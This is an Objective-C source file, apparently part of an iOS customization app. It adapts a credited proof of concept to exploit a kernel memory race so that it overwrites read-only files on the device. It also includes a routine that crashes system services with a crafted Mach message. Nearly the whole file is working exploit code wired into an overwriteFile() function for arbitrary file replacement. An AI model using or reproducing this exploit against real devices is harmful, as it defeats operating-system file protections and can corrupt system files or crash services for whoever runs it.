// Thanks Ian Beer for the PoC!

#import <Foundation/Foundation.h>
#include <string.h>
#include <mach/mach.h>
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/stat.h>
#include <libkern/OSAtomic.h> // I want a real spinlock!
#include <sys/time.h>
#include "vm_unaligned_copy_switch_race.h"
#import <Mandela-Swift.h> // Expose functions from Swift

char* get_temp_file_path(void) {
  return strdup([[NSTemporaryDirectory() stringByAppendingPathComponent:@"AAAAs"] fileSystemRepresentation]);
}

// create a read-only test file we can target:
char* set_up_tmp_file(void) {
  char* path = get_temp_file_path();
  printf("path: %s\n", path);
  
  FILE* f = fopen(path, "w");
  if (!f) {
    printf("opening the tmp file failed...\n");
    return NULL;
  }
  char* buf = malloc(PAGE_SIZE*10);
  memset(buf, 'A', PAGE_SIZE*10);
  fwrite(buf, PAGE_SIZE*10, 1, f);
  //fclose(f);
  return path;
}

kern_return_t
bootstrap_look_up(mach_port_t bp, const char* service_name, mach_port_t *sp);

struct xpc_w00t {
  mach_msg_header_t hdr;
  mach_msg_body_t body;
  mach_msg_port_descriptor_t client_port;
  mach_msg_port_descriptor_t reply_port;
};

mach_port_t get_send_once(mach_port_t recv) {
  mach_port_t so = MACH_PORT_NULL;
  mach_msg_type_name_t type = 0;
  kern_return_t err = mach_port_extract_right(mach_task_self(), recv, MACH_MSG_TYPE_MAKE_SEND_ONCE, &so, &type);
  if (err != KERN_SUCCESS) {
    printf("port right extraction failed: %s\n", mach_error_string(err));
      setMessage(@"GURU MEDITATION: Port right extraction failed!\nPlease send this to BomberFish with the following information: fail at 59", 1);
    return MACH_PORT_NULL;
  }
  printf("made so: 0x%x from recv: 0x%x\n", so, recv);
  return so;
}
// copy-pasted from an exploit I wrote in 2019...
// still works...

// (in the exploit for this: https://googleprojectzero.blogspot.com/2019/04/splitting-atoms-in-xnu.html )

void xpc_crasher(char* service_name) {
  mach_port_t client_port = MACH_PORT_NULL;
  mach_port_t reply_port = MACH_PORT_NULL;

  mach_port_t service_port = MACH_PORT_NULL;

  kern_return_t err = bootstrap_look_up(bootstrap_port, service_name, &service_port);
  if(err != KERN_SUCCESS){
      printf("unable to look up %s\n", service_name);
      setMessage(@"GURU MEDITATION: Unable to look up a service!\nPlease send this to BomberFish with the following information: fail at 81", 1);
    return;
  }

  if (service_port == MACH_PORT_NULL) {
    printf("bad service port\n");
      setMessage(@"GURU MEDITATION: Bad service port!\nPlease send this to BomberFish with the following information: fail at 85", 1);
    return;
  }

  // allocate the client and reply port:
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &client_port);
  if (err != KERN_SUCCESS) {
    printf("port allocation failed: %s\n", mach_error_string(err));
       setMessage(@"GURU MEDITATION: Port allocation failed!\nPlease send this to BomberFish with the following information: fail at 93", 1);
    return;
  }

  mach_port_t so0 = get_send_once(client_port);
  mach_port_t so1 = get_send_once(client_port);

  // insert a send so we maintain the ability to send to this port
  err = mach_port_insert_right(mach_task_self(), client_port, client_port, MACH_MSG_TYPE_MAKE_SEND);
  if (err != KERN_SUCCESS) {
      printf("port right insertion failed: %s\n", mach_error_string(err));
      setMessage(@"GURU MEDITATION: Port right insertion failed!\nPlease send this to BomberFish with the following information: fail at 104", 1);
    return;
  }

  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
  if (err != KERN_SUCCESS) {
      printf("port allocation failed: %s\n", mach_error_string(err));
      setMessage(@"GURU MEDITATION: Port allocation failed!\nPlease send this to BomberFish with the following information: fail at 111", 1);
      	return;
  }

  struct xpc_w00t msg;
  memset(&msg.hdr, 0, sizeof(msg));
  msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
  msg.hdr.msgh_size = sizeof(msg);
  msg.hdr.msgh_remote_port = service_port;
  msg.hdr.msgh_id   = 'w00t';

  msg.body.msgh_descriptor_count = 2;

  msg.client_port.name        = client_port;
  msg.client_port.disposition = MACH_MSG_TYPE_MOVE_RECEIVE; // we still keep the send
  msg.client_port.type        = MACH_MSG_PORT_DESCRIPTOR;

  msg.reply_port.name        = reply_port;
  msg.reply_port.disposition = MACH_MSG_TYPE_MAKE_SEND;
  msg.reply_port.type        = MACH_MSG_PORT_DESCRIPTOR;

  err = mach_msg(&msg.hdr,
                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                 msg.hdr.msgh_size,
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);

  if (err != KERN_SUCCESS) {
    printf("w00t message send failed: %s\n", mach_error_string(err));
    return;
  } else {
    printf("sent xpc w00t message\n");
  }

  mach_port_deallocate(mach_task_self(), so0);
  mach_port_deallocate(mach_task_self(), so1);

  return;
}

void* alloc_at(mach_vm_address_t desired_address, mach_vm_size_t size) {
  kern_return_t kr;
  mach_vm_address_t actual_address = desired_address;
  kr = mach_vm_allocate(mach_task_self(), &actual_address, size, VM_FLAGS_FIXED);
  if (kr != KERN_SUCCESS || actual_address != desired_address) {
    printf("fixed allocation at 0x%llx of size 0x%llx failed...\n", desired_address, size);
  }
  
  return (void*)desired_address;
}

OSSpinLock running_lock = 1;  // locked
OSSpinLock start_lock = 1;    // locked
OSSpinLock stop_lock = 0;     // unlocked
OSSpinLock finished_lock = 1; // locked
OSSpinLock all_done_lock = 1; // locked
 
uint8_t* modified_page = NULL;
uint8_t* original_page_contents = NULL;

uint8_t* success_test_page = NULL;

uint64_t* success_ptr = NULL;

// this has to be large enough to force an optimize copy
size_t obj_size = 256*1024;

void map_target_file_page_ro(int fd, void* target_addr, uint32_t file_page_offset) {
  void* mapped_at = mmap(target_addr, PAGE_SIZE, PROT_READ, MAP_FILE | MAP_FIXED | MAP_SHARED, fd, file_page_offset);
  if (mapped_at == MAP_FAILED) {
    printf("MMAP FAILED for target address: %p\n", target_addr);
      setMessage(@"GURU MEDITATION: MMAP failed!\nPlease send this to BomberFish with the following information: fail at 185", 1);
    perror("mmap error:");
  }
}

struct attempt_args {
  void* addr; // addr to flip
  uint32_t offset; // offset of page in file to map;
  int fd; // fd from which to map the page
};

void* thread_func(struct attempt_args* arg) {
  // signal that we're running:
  OSSpinLockUnlock(&running_lock);
  
  while (1) {
    // wait to start:
    OSSpinLockLock(&start_lock);
    OSSpinLockUnlock(&start_lock);
    
    OSMemoryBarrier();
    
    while(OSSpinLockTry(&stop_lock) == 0) {
      // flip the target area between a writable anonymous mapping and the target ro file mapping
      
      // anonymous writable mapping:
      mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)arg->addr, PAGE_SIZE);
      alloc_at((mach_vm_address_t)arg->addr, PAGE_SIZE);
      *((volatile char*)arg->addr) = 'A';
      // barrier?
      OSMemoryBarrier();
      
      usleep(100);
      
      // ro file mapping
      map_target_file_page_ro(arg->fd, (void*)arg->addr, arg->offset);
      
      usleep(100);
    }
    // we now hold the stop_mutex; drop it:
    OSSpinLockUnlock(&stop_lock);
    
    // make sure we won't restart:
    OSSpinLockLock(&start_lock);
    
    // signal that we're done and it's okay to deallocate memory
    OSSpinLockUnlock(&finished_lock);
    
    if (OSSpinLockTry(&all_done_lock)) {
      pthread_exit(NULL);
    }
  }
  return NULL;
}


void* get_empty_region(void) {
  mach_vm_address_t addr = 0;
  mach_vm_size_t size = PAGE_SIZE*10000;
  int kr = mach_vm_allocate(mach_task_self(), &addr, size, VM_FLAGS_ANYWHERE);
  if (kr != KERN_SUCCESS) {
    printf("failed to reserve large chunk of address space: (%s)\n", mach_error_string(kr));
      setMessage(@"GURU MEDITATION: Failed to reserve address space!\nPlease send this to BomberFish with the following information: fail at 247", 1);
    return NULL;
  }
  
  printf("large region at: 0x%016llx\n", addr);
  mach_vm_deallocate(mach_task_self(), addr, size);
  
  return addr;
}



void replace_file_page(char* target_path, uint32_t target_offset, uint8_t* new_page_contents) {
  pthread_t th = NULL;
  
  //offset_of_target_page_in_file = target_offset;
  
  int target_fd = open(target_path, O_RDONLY);
  if (target_fd == -1) {
    printf("failed to open the target file\n");
      setMessage(@"GURU MEDITATION: Failed to open the file!\nPlease send this to BomberFish with the following information: fail at 267", 1);
  }
  
  if (ROUND_DOWN_PAGE(target_offset) != target_offset) {
    printf("ERROR: this API only works for whole pages!!\n");
      setMessage(@"GURU MEDITATION: Not a full page!\nPlease send this to BomberFish with the following information: fail at 272", 1);
    return;
  }
  
  // map the target page so we can test if this r/o mapping gets modified
  success_ptr = mmap(0, PAGE_SIZE, PROT_READ, MAP_FILE | MAP_SHARED, target_fd, target_offset);
  if (success_ptr == MAP_FAILED) {
    printf("failed to mmap file for success test\n");
      setMessage(@"GURU MEDITATION: Failed to mmap file!\nPlease send this to BomberFish with the following information: fail at 282", 1);
    return;
  }
  
  modified_page = new_page_contents;
  
  success_test_page = (uint8_t*)success_ptr;
  
  uint32_t iter_count = 0;
  struct timeval start_time;
  gettimeofday(&start_time, NULL);
  uint64_t start_ms = (start_time.tv_sec * 1000) + (start_time.tv_usec / 1000);
  
  struct attempt_args args = {0};
  
  while (1) {
    iter_count++;
    kern_return_t kr;
    mach_vm_address_t empty_region_base = get_empty_region();
    
    mach_vm_address_t e0 = empty_region_base + (PAGE_SIZE*6000);
    mach_vm_address_t e2 = e0 - obj_size;
    
    // ro file mapping
    map_target_file_page_ro(target_fd, (void*)e0, target_offset);
    
    volatile char ch = *(volatile char*)e0;
    
    // make a memory object - this is the lower object which we don't want the anonymous memory to
    // coalesce with
    mach_port_t named_port = MACH_PORT_NULL;
    kr = mach_memory_object_memory_entry_64(
                                            mach_host_self(),
                                            1,
                                            obj_size,
                                            VM_PROT_READ | VM_PROT_WRITE,
                                            MACH_PORT_NULL,
                                            &named_port);
    if (kr != KERN_SUCCESS) {
      printf("failed to allocate memory object\n");
      setMessage(@"GURU MEDITATION: Failed to allocate memory object!\nPlease send this to BomberFish with the following information: fail at 320", 1);
    }
    
    kr = mach_vm_map(mach_task_self(),
                     &e2,
                     obj_size,
                     0, // mask
                     VM_FLAGS_FIXED,
                     named_port,
                     0,
                     1, // copy
                     VM_PROT_READ | VM_PROT_WRITE,
                     VM_PROT_READ | VM_PROT_WRITE,
                     VM_INHERIT_NONE); // inheritance
    if (kr != KERN_SUCCESS) {
      printf("failed to map memory object copy at e2\n");
        setMessage(@"GURU MEDITATION: Failed to map memory object copy at e2!\nPlease send this to BomberFish with the following information: fail at 336", 1);
        
    } else {
      printf("mapped e2 at: 0x%llx\n", e2);
    }
    memset((void*)e2, 'B', obj_size);
    
    // the source region:
    // this doesn't actually have to be at a fixed address
    mach_vm_address_t e5 = empty_region_base + (PAGE_SIZE*3000);
    alloc_at(e5, obj_size*2);
    memset((void*)e5, 'C', obj_size*2);
    
    // place the new file contents 1 byte below obj_size:
    memcpy((char*)(e5+obj_size-1), modified_page, PAGE_SIZE);
    
    // spin up the racer thread
    
    args.offset = target_offset;
    args.fd = target_fd;
    args.addr = (void*)e0;
    OSMemoryBarrier();
    
    if (th == NULL) {
      //OSSpinLockLock(&running_lock);
      
      pthread_create(&th, NULL, thread_func, (void*)&args);
      
      OSSpinLockLock(&running_lock);
    }
    
    // keep it racing
    OSSpinLockLock(&stop_lock);
    
    // signal to the thread to start racing:
    OSSpinLockUnlock(&start_lock);
    
    // do the unaligned object copy:
    mach_vm_size_t copied_size = 0;
    mach_vm_size_t size_to_copy = obj_size-1+PAGE_SIZE;
    kr = mach_vm_read_overwrite(mach_task_self(),     // copy FROM this map
                                e5,                   //      FROM this address
                                size_to_copy,    //       FOR this many bytes
                                (e2+1), //      TO this address in this current map
                                &copied_size);
    if (kr != KERN_SUCCESS) {
      printf("overwrite failed\n");
      setMessage(@"GURU MEDITATION: Couldn't overwrite file!\nAre you on 16.2?", 1);
    } else {
      printf("overwrite succeeded\n");
        setMessage(@"Success: Overwrite succeeded!", 0);
    
    }
    
    // success test:
    int won = 0;
    if ((memcmp(success_test_page, modified_page, PAGE_SIZE)) == 0) {
      struct timeval end_time;
      gettimeofday(&end_time, NULL);
      uint64_t end_ms = (end_time.tv_sec * 1000) + (end_time.tv_usec / 1000);
      uint64_t elapsed_ms = end_ms - start_ms;
      printf("modified the file page after %d iterations (%llu milliseconds)\n", iter_count, elapsed_ms);
      
      OSSpinLockUnlock(&all_done_lock);
      won = 1;
    }
    
    // signal to the thread to stop racing
    OSSpinLockUnlock(&stop_lock);
    
    // wait for the thread to stop racing
    OSSpinLockLock(&finished_lock);
    
    // clean up:
    kr = mach_vm_deallocate(mach_task_self(), e0, obj_size);
    mach_vm_deallocate(mach_task_self(), e2, obj_size);
    mach_vm_deallocate(mach_task_self(), e5, obj_size*2);
    mach_port_deallocate(mach_task_self(), named_port);
    
    if (won) {
      pthread_join(th, NULL);
      printf("racing thread exited\n");
      break;
    }
  }
  
  return;
}


void* file_page(char* path, uint32_t page_offset) {
  int fd = open(path, O_RDONLY);
  if (fd < 0) {
    printf("failed to open file: %s\n", path);
    setMessage(@"GURU MEDITATION: Failed to open the file!\nPlease send this to BomberFish with the following information: fail at 430", 1);
    return NULL;
  }
  
    
  kern_return_t kr;
  mach_vm_address_t addr = 0;
  kr = mach_vm_allocate(mach_task_self(), &addr, PAGE_SIZE, VM_FLAGS_ANYWHERE);
  if (kr != KERN_SUCCESS) {
    printf("mach_vm_allocate failed\n");
      setMessage(@"GURU MEDITATION: mach_vm_allocate has failed!\nPlease send this to BomberFish with the following information: fail at 439", 1);
    return NULL;
  }
  
  off_t offset = lseek(fd, page_offset, SEEK_SET);
  if (offset != page_offset) {
    printf("failed to seek the file\n");
      setMessage(@"GURU MEDITATION: Failed to seek the file!\nPlease send this to BomberFish with the following information: fail at 446", 1);
  }
  
  ssize_t n_read = read(fd, (void*)addr, PAGE_SIZE);
  if (n_read != PAGE_SIZE) {
    printf("short read\n");
    return NULL;
  }
  
  close(fd);
  
  return (void*)addr;
}

void free_page(uint8_t* page) {
  mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)page, PAGE_SIZE);
}

void overwriteFile(NSData *data, NSString *path) {
  setMessage(@"Applying...", 3);
  int fd = open([path UTF8String], O_RDONLY);
  if (fd < 0) {
    printf("failed to open file: %s\n", [path UTF8String]);
    setMessage(@"GURU MEDITATION: Failed to open the file!\nPlease send this to BomberFish with the following information: fail at 470", 1);
    return;
  }

  int pages = (int)ceil((double)[data length] / (double)PAGE_SIZE);
  for (int i = 0; i < pages; i++) {
    int offset = i * PAGE_SIZE;
    int length = MIN(PAGE_SIZE, (int)[data length] - offset);
    uint8_t* page = malloc(PAGE_SIZE);
    memset(page, 0, PAGE_SIZE);
    memcpy(page, [data bytes] + offset, length);
    // is the length of the page correct?
    if (length != PAGE_SIZE) {
      printf("page %d is not full length, filling with zeros\n", i);
        setMessage(@"Warning: Page is not full-length, padding with zeros...", 2);
      length = PAGE_SIZE;
      memset(page + length, 0, PAGE_SIZE - length);
    }
    replace_file_page([path UTF8String], offset, page);
    free(page);
    NSLog(@"wrote page %d, offset %d, length %d", i, offset, length);
    setMessage(@"Success: Wrote file!", 0);
  }

  close(fd);
}
